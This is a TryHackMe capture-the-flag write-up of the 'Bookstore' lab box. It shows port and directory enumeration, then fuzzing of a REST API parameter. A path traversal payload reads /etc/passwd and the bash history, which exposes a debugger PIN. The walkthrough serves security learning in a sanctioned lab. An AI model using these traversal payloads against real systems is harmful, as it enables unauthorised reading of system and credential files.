<h1 align="center">Bookstoreim</h1>
<p align="center"><em>A Beginner level box with basic web enumeration and REST API Fuzzing</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/c2934bf0-abe3-429d-8e65-c4ddcf4b3419"><br>
July 14, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.
It´s part of my <code>434</code>-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>. It is classified as a medium-level CTF.
You can join it clicking  <a href="https://tryhackme.com/room/bookstoreoc">here</a>.<br><br>
<img width="1200px" src=""></p>



<br>

<h2>Task 1 . Bookstore</h2>
<p>Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited, you can contact me on twitter @siddhantc_ for giving any feedback regarding the machine.</p>


<h3>nmap</h3>

```bash
-162-93:~/Bookstore# nmap -sC -sV -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Book Store
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Mon, 14 Jul 2025 02:56:03 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 116
|     Access-Control-Allow-Origin: *
|     Connection: close
|     <title>Home</title>
|     <h1>Foxy REST API v2.0</h1>
|     <p>This is a REST API for science fiction novels.</p>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Mon, 14 Jul 2025 02:56:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Connection: close
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

<h3>gobuster</h3>

```bash
:~/Bookstore# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,php,js,back,old,html -t 200
...
http://10.10.49.52/images               (Status: 301) [Size: 311] [--> http://10.10.49.52/images/]
http://10.10.49.52/login.html           (Status: 200) [Size: 5325]
http://10.10.49.52/index.html           (Status: 200) [Size: 6452]
http://10.10.49.52/.html                (Status: 403) [Size: 276]
http://10.10.49.52/books.html           (Status: 200) [Size: 2940]
http://10.10.49.52/assets               (Status: 301) [Size: 311] [--> http://10.10.49.52/assets/]
http://10.10.49.52/javascript           (Status: 301) [Size: 315] [--> http://10.10.49.52/javascript/]
http://10.10.49.52/LICENSE.txt          (Status: 200) [Size: 17130]
http://10.10.49.52/.html                (Status: 403) [Size: 276]
http://10.10.49.52/server-status        (Status: 403) [Size: 276]
...
```

```bash
:~/Bookstore# gobuster dir -u http://TargetIP:5000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,php,js,back,old,html -t 200
...
http://10.10.49.52:5000/api                  (Status: 200) [Size: 825]
...
http://10.10.49.52:5000/robots.txt           (Status: 200) [Size: 45]
...
http://10.10.49.52:5000/console              (Status: 400) [Size: 167]
...
```

<h3>web</h3>

<img width="1094" height="103" alt="image" src="https://github.com/user-attachments/assets/84694a9d-0bcb-4847-a6dd-ea2e44bee2d3" />

<p>/robots.txt</p>

<img width="1125" height="79" alt="image" src="https://github.com/user-attachments/assets/9d11a72e-ea05-4719-86a9-616f212b7a01" />

<p>/api</p>

<img width="1104" height="336" alt="image" src="https://github.com/user-attachments/assets/67f43716-30a8-41e7-a718-2ada9e45b76c" />


<h3>wfuzz</h3>

```bash
/Bookstore# wfuzz -u http://10.10.49.52:5000/api/v1/resources/books\?FUZZ\=../../../../../../../etc/passwd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404,503
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/local/lib/python3.8/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/local/lib/python3.8/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.49.52:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                        
===================================================================

000000395:   200        37 L     53 W     2015 Ch     "show"                                                         
000000486:   200        1 L      1 W      3 Ch        "author"                                                       
000000529:   200        1 L      1 W      3 Ch        "id"                                                           
000011548:   200        1 L      1 W      3 Ch        "published"         
...
```


<p>TargetIP:5000/api/v1/resources/books?show=../../../../../../../etc/passwd</p>

<img width="1131" height="233" alt="image" src="https://github.com/user-attachments/assets/09e04a36-1395-4395-82f9-fa72b0cc40fb" />

<p>TargetIP:5000/api/v1/resources/books?show=.bash_history</p>

<p>pin = 123-321-135</p>

<img width="1072" height="50" alt="image" src="https://github.com/user-attachments/assets/7f068d98-578b-4a31-afac-17eb6c1281eb" />


